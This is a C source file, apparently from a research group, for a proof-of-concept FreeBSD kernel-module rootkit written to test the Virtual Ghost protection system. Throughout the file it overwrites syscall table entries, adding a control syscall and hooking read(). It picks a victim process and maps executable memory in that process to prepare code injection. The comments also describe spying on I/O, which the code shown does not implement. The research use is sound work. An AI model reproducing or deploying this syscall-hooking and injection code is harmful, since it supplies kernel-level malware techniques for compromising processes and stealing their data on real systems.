/*===- rootkit.c - Example Rootkit =---------------------------------------===
 * 
 *                        Example Virtual Ghost Rootkit
 *
 * This file was developed by the LLVM research group and is distributed under
 * the University of Illinois Open Source License. See LICENSE.TXT for details.
 * 
 *===----------------------------------------------------------------------===
 *
 * This file implements a proof of concept rootkit which tries to attack
 * applications on the Virtual Ghost system.
 *
 * This code is based on the examples in Designing BSD Rootkits by Joseph Kong.
 *
 *===----------------------------------------------------------------------===
 */

#include <sys/fcntl.h>
#include <sys/param.h>
#include <sys/module.h>
#include <sys/mman.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/proc.h>
#include <sys/sysent.h>
#include <sys/syscall.h>
#include <sys/sysproto.h>

//
// Design:
//  1) Find designated target process
//  2) Spy on its I/O
//  3) Attempt to run new code within the process
//  4) Attempt to directly read application data
//

// Target process to attack
struct proc * victimProc = 0;

// Flags whether malicous code has been injected
unsigned char injected = 0;

//
// Function: isVictimThread()
//
// Description:
//  Determines whether the specified thread is the thread that we are
//  attacking.
//
// Return value:
//  true  - The thread belongs to the process that we are attacking.
//  false - The thread belongs to a process that we are not attacking.
//
static inline unsigned char
isVictimThread (struct thread * td) {
  if ((victimProc) && (td->td_proc == victimProc))
    return 1;
  return 0;
}

static void
insertMaliciousCode (struct thread * td) {
  //
  // Don't inject anything if we've already done it.
  //
  if (injected)
    return;

  //
  // Allocate some memory within the victim process.
  //
  uintptr_t addr = 0;
  struct mmap_args args;
  args.addr = 0;
  args.len = 4096;
  args.prot = PROT_READ | PROT_WRITE | PROT_EXEC;
  args.flags = MAP_ANON;
  args.fd = 0;
  args.pos = 0;
  addr = sys_mmap (td, &args);
  printf ("Rootkit: memory at %lx\n", addr);

  //
  // Mark that we've inserted the malicious code.
  //
  injected = 1;
}

//
// Function: command_hook()
//
// Description:
//  This is a system call that we provide to allow a user-space process to
//  control the rootkit.  It provides services such as configuring the victim
//  process to attack.
//
static void
command_hook (struct thread * td, void * syscall_args) {
  // System call arguments
  struct config_args {
    pid_t victimPID;
  };

  //
  // Find the victim process that we want to attack.  A victim PID of zero
  // mean that we don't want to attack any process.
  //
  struct config_args * argsp = (struct config_args *)(syscall_args);
  victimProc = (argsp->victimPID) ?  pfind (argsp->victimPID) : 0;
  return;
}

//
// Function: read_hook()
//
// Description:
//  This function intercepts the read() system call.  Its job is to swipe data
//  read from the application.
//
static ssize_t
read_hook (struct thread * td, void * syscall_args) {
  // Number of bytes read by system call
  ssize_t bytesRead;

  //
  // Perform the read using the original system call.
  //
  bytesRead = sys_read (td, syscall_args);

  //
  // If this is the victim process, and we have not injected code yet,
  // inject the code.
  //
  if (isVictimThread (td))
    insertMaliciousCode (td);
  return bytesRead;
}

static void
initializeRootkit (void) {
  // Add a system call to control the rootkit
  sysent[11].sy_call = (sy_call_t *) command_hook;

  // Intercept the read system call
  sysent[SYS_read].sy_call = (sy_call_t *) read_hook;
}

static void
unloadRootkit (void) {
  //
  // Restore all hooked system calls.
  //
  sysent[SYS_read].sy_call = (sy_call_t *) sys_read;
}

//
// Function: load()
//
// Description:
//  This function is called by the kernel when loading and unloading the
//  module.  This function should initialize the module to do our evil bidding.
//
static int
load (struct module * module, int cmd, void * arg) {
  int error = 0;

  switch (cmd) {
    case MOD_LOAD:
      initializeRootkit();
      uprintf ("Rootkit: Loaded: %p\n", load);
      break;

    case MOD_UNLOAD:
      unloadRootkit();
      uprintf ("Rootkit: Removed\n");
      break;

    default:
      error = EOPNOTSUPP;
      break;
  }

  return error;
}

static moduledata_t rootkit_mod = {
  "rootkit",
  load,
  0
};

DECLARE_MODULE(rootkit, rootkit_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
